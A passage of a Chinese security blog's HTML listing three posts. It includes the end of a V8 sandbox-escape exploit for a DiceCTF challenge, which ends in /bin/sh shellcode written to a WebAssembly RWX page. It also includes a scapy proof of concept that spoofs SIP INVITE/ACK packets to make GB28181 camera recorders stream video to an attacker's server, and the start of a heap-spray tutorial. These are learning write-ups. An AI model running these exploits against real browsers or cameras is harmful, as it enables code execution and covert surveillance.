class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    gc() &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printhex(s, val) &#123;</span><br><span class="line">      <span class="comment">//%DebugPrint(s + " 0x" + val.toString(16));</span></span><br><span class="line">      <span class="built_in">console</span>.log(s + <span class="string">" 0x"</span> + val.toString(<span class="number">16</span>));</span><br><span class="line">      <span class="comment">//document.write(s +' ' + val.toString(16) + " &lt;/br&gt;");</span></span><br><span class="line">      <span class="comment">//alert(s + " 0x" + val.toString(16));</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> helper = <span class="keyword">new</span> Helpers();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> i64arr= <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_imported_mutable_globals_arr = [<span class="number">0x1337133713371337</span>];</span><br><span class="line"><span class="keyword">var</span> leaker = &#123; <span class="string">'x'</span>:fake_imported_mutable_globals_arr&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x6d</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x09</span>,<span class="number">0x02</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x7e</span>,<span class="number">0x60</span>,<span class="number">0x01</span>,<span class="number">0x7e</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x0e</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x6a</span>,<span class="number">0x73</span>,<span class="number">0x06</span>,<span class="number">0x67</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x03</span>,<span class="number">0x7e</span>,<span class="number">0x01</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x07</span>,<span class="number">0x19</span>,<span class="number">0x02</span>,<span class="number">0x09</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x47</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x47</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x0b</span>,<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x24</span>,<span class="number">0x00</span>,<span class="number">0x0b</span>,<span class="number">0x00</span>,<span class="number">0x14</span>,<span class="number">0x04</span>,<span class="number">0x6e</span>,<span class="number">0x61</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x67</span>])</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code); </span><br><span class="line"><span class="keyword">const</span> global = <span class="keyword">new</span> WebAssembly.Global(&#123;<span class="attr">value</span>:<span class="string">'i64'</span>, <span class="attr">mutable</span>:<span class="literal">true</span>&#125;, <span class="number">0</span>n);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod, &#123;<span class="attr">js</span>:&#123;global&#125;&#125;); </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> getGlobal= wasm_instance.exports.getGlobal;</span><br><span class="line"><span class="keyword">var</span> setGlobal= wasm_instance.exports.setGlobal;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbWrite</span>(<span class="params">addr,val</span>)</span>&#123;</span><br><span class="line">    oob_arr[<span class="number">0x17</span>] = helper.itof(addr);</span><br><span class="line">    setGlobal(BigInt.asUintN(<span class="number">64</span>,BigInt(val)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbRead</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    oob_arr[<span class="number">0x17</span>] = helper.itof(addr);</span><br><span class="line">    <span class="keyword">return</span> BigInt.asUintN(<span class="number">64</span>, getGlobal());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    leaker[<span class="string">'x'</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> BigInt.asUintN(<span class="number">64</span>,js_base + BigInt(helper.ftoih(oob_arr[<span class="number">0x1b</span>])));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">oob_arr.setLength(<span class="number">0x10000000</span>/<span class="number">8</span>);</span><br><span class="line">dp(oob_arr);</span><br><span class="line">dp(fake_imported_mutable_globals_arr);</span><br><span class="line">dp(leaker);</span><br><span class="line"><span class="comment">// %DebugPrint(i64arr);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">oob_arr[<span class="number">0x11</span>] = helper.isethtof(helper.ftoi(oob_arr[<span class="number">0x11</span>]),<span class="number">0x10000000</span>); <span class="comment">// length</span></span><br><span class="line">oob_arr[<span class="number">0x13</span>] = helper.itof(<span class="number">0</span>n); <span class="comment">// external_pointer</span></span><br><span class="line"><span class="comment">// %DebugPrint(i64arr);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// leak js_base</span></span><br><span class="line"><span class="keyword">var</span> js_base = <span class="number">0</span>n;</span><br><span class="line"><span class="keyword">if</span>( (i64arr[<span class="number">3</span>] &gt;&gt; <span class="number">32</span>n ) == (i64arr[<span class="number">4</span>] &gt;&gt; <span class="number">32</span>n)) &#123;</span><br><span class="line">    js_base = BigInt.asUintN(<span class="number">64</span>,i64arr[<span class="number">3</span>]) &amp; <span class="number">0xffff00000000</span>n;</span><br><span class="line">&#125;</span><br><span class="line">helper.printhex(<span class="string">'js_base @'</span>, js_base);</span><br><span class="line"></span><br><span class="line">fake_imported_mutable_globals_arr_addr = addrOf(fake_imported_mutable_globals_arr);</span><br><span class="line">fake_imported_mutable_globals_addr = fake_imported_mutable_globals_arr_addr - <span class="number">0x9</span>n;</span><br><span class="line"></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">oob_arr_addr = addrOf(oob_arr);</span><br><span class="line">wasm_inst_addr = addrOf(wasm_instance);</span><br><span class="line"></span><br><span class="line">imported_mutable_globals_offset = (wasm_inst_addr - js_base + <span class="number">0x50</span>n <span class="number">-1</span>n ) / <span class="number">8</span>n;</span><br><span class="line"></span><br><span class="line">dp(wasm_instance);</span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">helper.printhex(<span class="string">'fake_obj_addr @'</span>, fake_imported_mutable_globals_addr);</span><br><span class="line">helper.printhex(<span class="string">'oob_arr_addr @'</span>, oob_arr_addr);</span><br><span class="line">helper.printhex(<span class="string">'wasm_instance_addr @'</span>, wasm_inst_addr);</span><br><span class="line">helper.printhex(<span class="string">'wasm_instance.imported_mutable_globals_offset '</span>, imported_mutable_globals_offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// i64arr[imported_mutable_globals_offset] = helper.isethtoi(i64arr[imported_mutable_globals_offset] , Number(fake_imported_mutable_globals_addr &amp; 0xffffffffn));</span></span><br><span class="line"><span class="comment">// i64arr[imported_mutable_globals_offset + 1n] = helper.isetltoi(i64arr[imported_mutable_globals_offset + 1n], Number(fake_imported_mutable_globals_addr &gt;&gt; 32n));</span></span><br><span class="line">helper.printhex(<span class="string">'i64arr[globals_offset] @'</span>, i64arr[imported_mutable_globals_offset]);</span><br><span class="line">i64arr[imported_mutable_globals_offset] = fake_imported_mutable_globals_addr;</span><br><span class="line"></span><br><span class="line">dp(wasm_instance);</span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code2= <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line"><span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>,</span><br><span class="line"><span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>,</span><br><span class="line"><span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>,</span><br><span class="line"><span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_mod2 = <span class="keyword">new</span> WebAssembly.Module(wasm_code2);</span><br><span class="line"><span class="keyword">var</span> wasm_instance2 = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod2);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance2.exports.main;</span><br><span class="line"></span><br><span class="line">wasm_instance2_addr = addrOf(wasm_instance2);</span><br><span class="line"></span><br><span class="line">wasm_instance2_rwx_page_addr = wasm_instance2_addr + <span class="number">0x60</span>n - <span class="number">1</span>n;</span><br><span class="line">helper.printhex(<span class="string">'rwx page addr @'</span>, wasm_instance2_rwx_page_addr);</span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line">wasm_instance2_rwx_page = arbRead(wasm_instance2_rwx_page_addr);</span><br><span class="line">helper.printhex(<span class="string">'rwx page @'</span>, wasm_instance2_rwx_page);</span><br><span class="line"></span><br><span class="line">shellcode = [<span class="number">0x99583b6a</span>, <span class="number">0x622fbb48</span>, <span class="number">0x732f6e69</span>, <span class="number">0x48530068</span>, <span class="number">0x2d68e789</span>, <span class="number">0x48000063</span>, <span class="number">0xe852e689</span>, <span class="number">0x00000008</span>,</span><br><span class="line"><span class="number">0x6e69622f</span>, <span class="number">0x0068732f</span>, <span class="number">0x89485756</span>, <span class="number">0x00050fe6</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;shellcode.length; i=i+<span class="number">2</span>)&#123;</span><br><span class="line">    arbWrite(wasm_instance2_rwx_page +(BigInt(i) * <span class="number">4</span>n),helper.isetlhtoi(shellcode[i],shellcode[i+<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dp(wasm_instance2);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2014.png" alt="Untitled"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html" target="_blank" rel="noopener">https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html</a></li>
+<li><a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/" target="_blank" rel="noopener">https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/</a></li>
+<li><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#" target="_blank" rel="noopener">https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/Global/Global" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/Global/Global</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format</a></li>
+<li><a href="https://github.com/mdn/webassembly-examples/blob/master/js-api-examples/global.wat" target="_blank" rel="noopener">https://github.com/mdn/webassembly-examples/blob/master/js-api-examples/global.wat</a></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/二进制/">二进制</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/浏览器/">浏览器</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-pentest-gb28181-attack" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="2021/10/05/pentest-gb28181-attack/" class="article-date">
+      <time datetime="2021-10-05T01:00:52.000Z" itemprop="datePublished">2021-10-05</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2021/10/05/pentest-gb28181-attack/">GB28181 的一点小问题</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="GB28181"><a href="#GB28181" class="headerlink" title="GB28181"></a>GB28181</h1><p>GB28181 是视频监控领域的国家标准，规定了公共安全视频监控联网系统的互联结构， 传输、交换、控制的基本要求和安全性要求， 以及控制、传输流程和协议接口等技术要求。</p>
+<p>目前大多数厂商的摄像头都支持这个协议，用户可以自己实现媒体服务器，使用这个协议从摄像头上拉流观看。</p>
+<h1 id="客户端拉流过程"><a href="#客户端拉流过程" class="headerlink" title="客户端拉流过程"></a>客户端拉流过程</h1><p>见图</p>
+<p><img src="/2021/10/05/pentest-gb28181-attack/1.png" alt="1"></p>
+<p>GB28181 协议会话通道用的是 SIP 协议，往下看需要一些 SIP 协议相关的知识。</p>
+<p>带入到实际场景中，各个实体的身份 ⬇️：</p>
+<ul>
+<li>媒体流接收者：观众，客户端</li>
+<li>SIP 服务器：信令服务器，和摄像头 NVR 设备交互，摄像头 NVR 在使用前需要发送 <code>REGISTER</code> 包注册到 SIP 服务器</li>
+<li>媒体服务器：接收推流的服务器，转发媒体流给观众</li>
+<li>媒体流发送者：摄像头 NVR</li>
+</ul>
+<p>过程：</p>
+<blockquote>
+<p>1、媒体流接收者向 SIP 服务器发送 Invite 消息，消息头域中携带 Subject 字段，表明点播的视频 源 ID、分辨率、媒体流接收者 ID、接收端媒体流序列号标识等参数，SDP 消息体中 s 字段为“Play” 代表实时点播;</p>
+<p>2、SIP 服务器收到 Invite 请求后，通过三方呼叫控制建立媒体服务器和媒体流发送者之间的媒体连接。向媒体服务器发送 Invite 消息，此消息不携带 SDP 消息体;</p>
+<p>3、媒体服务器收到 SIP 服务器的 Invite 请求后，回复 200OK 响应，携带 SDP 消息体，消息体中 描述了媒体服务器接收媒体流的 IP、端口、媒体格式等内容;</p>
+<p>4、SIP 服务器收到媒体服务器返回的 200OK 响应后，向媒体流发送者发送 Invite 请求，请求中携 带消息 3 中媒体服务器回复的 200OK 响应消息体，并且修改 s 字段为“Play”代表实时点播，增 加 y 字段描述 SSRC 值，f 字段描述媒体参数;</p>
+<p>5、媒体流发送者收到 SIP 服务器的 Invite 请求后，回复 200OK 响应，携带 SDP 消息体，消息体 中描述了媒体流发送者发送媒体流的 IP、端口、媒体格式、SSRC 字段等内容;</p>
+<p>6、SIP 服务器收到媒体流发送者返回的 200OK 响应后，向媒体服务器发送 ACK 请求，请求中携 带消息 5 中媒体流发送者回复的 200OK 响应消息体，完成与媒体服务器的 Invite 会话建立过程;</p>
+<p>7、SIP 服务器收到媒体流发送者返回的 200OK 响应后，向媒体流发送者发送 ACK 请求，请求中 不携带消息体，完成与媒体流发送者的 Invite 会话建立过程;</p>
+<p>之后媒体流发送者推流到媒体服务器，媒体服务器在转发给接收者。</p>
+</blockquote>
+<h1 id="风险点"><a href="#风险点" class="headerlink" title="风险点"></a>风险点</h1><p>看上面的活动图，媒体流发送者在收到 SIP 服务器的 <code>INVITE + ACK</code> 包之后就开始推流，<br><code>BYE</code> 包用于终止推流，其它实体和它并没有交互。</p>
+<p><strong>一般情况下，NVR 支持的 SIP 是基于 UDP 的，而 UDP 报文的源 IP 是可以伪造。假如流媒体发送者（即NVR）没有对接受的信令校验认证，攻击者只要知道 SIP 服务器的 IP 地址，就可以伪造 SIP 服务器的身份，向 NVR 发起推流请求 （<code>INVITE + ACK</code> 包)，推流到任意的流媒体服务器。</strong></p>
+<p>如下</p>
+<p><img src="/2021/10/05/pentest-gb28181-attack/2.png" alt="2"></p>
+<blockquote>
+<p>最终效果是绕过 SIP 服务器，直接看摄像头了。</p>
+</blockquote>
+<p>用 <code>scapy</code> 写 POC 很容易</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">INVITE_PKG =<span class="string">'''INVITE sip:66612310001@192.168.1.2 SIP/2.0</span></span><br><span class="line"><span class="string">Call-ID: 0a097798b89c7897982198abcde8291@192.168.1.1</span></span><br><span class="line"><span class="string">CSeq: 2 INVITE</span></span><br><span class="line"><span class="string">From: &lt;sip:77779200001@6661200000&gt;;tag=fromTag</span></span><br><span class="line"><span class="string">To: &lt;sip:66612310001@6661200000&gt;</span></span><br><span class="line"><span class="string">Via: SIP/2.0/UDP 192.168.1.2</span></span><br><span class="line"><span class="string">Max-Forwards: 70</span></span><br><span class="line"><span class="string">Contact: &lt;sip:77779200001@192.168.1.1:5060&gt;</span></span><br><span class="line"><span class="string">Content-Type: Application/SDP</span></span><br><span class="line"><span class="string">Content-Length: 248</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">v=0</span></span><br><span class="line"><span class="string">o=77779200001 0 0 IN IP4 192.168.1.1</span></span><br><span class="line"><span class="string">s=Play</span></span><br><span class="line"><span class="string">u=66612310001:0</span></span><br><span class="line"><span class="string">c=IN IP4 188.8.8.8</span></span><br><span class="line"><span class="string">t=0 0</span></span><br><span class="line"><span class="string">m=video 2021 RTP/AVP 96 98 97</span></span><br><span class="line"><span class="string">a=recvonly</span></span><br><span class="line"><span class="string">a=rtpmap:96 PS/90000</span></span><br><span class="line"><span class="string">a=rtpmap:98 H264/90000</span></span><br><span class="line"><span class="string">a=rtpmap:97 MPEG4/90000</span></span><br><span class="line"><span class="string">y=0200000849</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>.replace(<span class="string">'\n'</span>,<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">sendp(Ether()/IP(dst=<span class="string">'192.168.1.2'</span>,src=<span class="string">'192.168.1.1'</span>)/UDP(dport=<span class="number">5060</span>)/INVITE_PKG)</span><br><span class="line"></span><br><span class="line">ACK_PKG = <span class="string">'''ACK sip:66612310001@192.168.1.2 SIP/2.0</span></span><br><span class="line"><span class="string">Call-ID: 0a097798b89c7897982198abcde8291@192.168.1.1</span></span><br><span class="line"><span class="string">CSeq: 2 ACK</span></span><br><span class="line"><span class="string">From: &lt;sip:77779200001@6661200000&gt;;tag=fromTag</span></span><br><span class="line"><span class="string">To: &lt;sip:66612310001@6661200000&gt;</span></span><br><span class="line"><span class="string">Via: SIP/2.0/UDP 192.168.1.2</span></span><br><span class="line"><span class="string">Max-Forwards: 70</span></span><br><span class="line"><span class="string">Contact: &lt;sip:77779200001@192.168.1.1:5060&gt;</span></span><br><span class="line"><span class="string">Content-Type: Application/SDP</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>.replace(<span class="string">'\n'</span>,<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">sendp(Ether()/IP(dst=<span class="string">'192.168.1.2'</span>,src=<span class="string">'192.168.1.1'</span>)/UDP(dport=<span class="number">5060</span>)/ACK_PKG)</span><br></pre></td></tr></table></figure>
+<p>目前国内要求运营商在接入网上进行源地址验证，所以公网上这种攻击可能不是那么容易成功，但总有些路由器设备配置会存在缺陷，还是可以伪造的，看运气了。</p>
+<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>GB28181 中有提到关于 “SIP 信令认证”，在 SIP 服务器和媒体流发送者之间加入一个加密模块，每个 SIP 信令中加入额外的校验字段。在每一端接收到 SIP 信令后都要去和这个加密模块校验，校验通过的信令才会被处理。</p>
+<p><img src="/2021/10/05/pentest-gb28181-attack/3.png" alt="3"></p>
+<blockquote>
+<p>前端设备： 联网系统中安装于监控现场的信息采集、编码/处理、存储、传输、安全控制等设备。 这里指 NVR。</p>
+</blockquote>
+<p>这只是一个补充的部分，还没有看到有哪家监控厂商实现，因为需要有配套的 SIP 服务器，大客户才能定制吧。</p>
+<p>如果对安全性要求比较高，可以考虑让 NVR 走安全隧道。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Pentest/">Pentest</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-realpwn-heap-spary-exercise" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="2021/07/07/realpwn-heap-spary-exercise/" class="article-date">
+      <time datetime="2021-07-07T11:18:28.000Z" itemprop="datePublished">2021-07-07</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2021/07/07/realpwn-heap-spary-exercise/">【RealPwn-2】 堆喷练习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>[RealPwn] 系列是我学习 pwn 的笔记，只记录真实场景中常用到的漏洞利用技术。</p>
+</blockquote>
+<h1 id="堆喷"><a href="#堆喷" class="headerlink" title="堆喷"></a>堆喷</h1><p>堆喷的利用，简单概括就是，申请大量内存，申请到 <code>0x0C0C0C0C</code> ，写入 slides + shellcode ，再控制 EIP 指向 <code>0x0C0C0C0C</code> 即可。</p>
+<blockquote>
+<p>理论上这里的 <code>0x0C0C0C0C</code> 可以替换为别的，比如 <code>0x90</code>、<code>0x0D</code> 等不影响shellcode 执行的指令。</p>
+</blockquote>
+<p>实际场景，常见的思路是覆盖对象的虚函数表指针 vptr，在 <code>0x0C0C0C0C</code> 伪造一个虚函数表，填满 <code>0x0C0C0C0C</code> + shellcode ，当调用对象的虚函数时，会取到 <code>0x0C0C0C0C</code> 作为函数的地址，跳回到 <code>0x0C0C0C0C</code> 的起始，把后面的数据当作指令执行， </p>
+<p><img src="/2021/07/07/realpwn-heap-spary-exercise/v.png" alt="v"></p>
+<blockquote>
+<p>为什么不用 <code>0x90909090</code> (nop;nop;nop;nop;) ? 是因为 <code>0x90909090 &gt; 0x7fffffff</code> 处在内核空间，程序跳到那会 crash。</p>
+</blockquote>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>开始调吧，还是 VS2019 + x32dbg 。</p>
+<p>代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 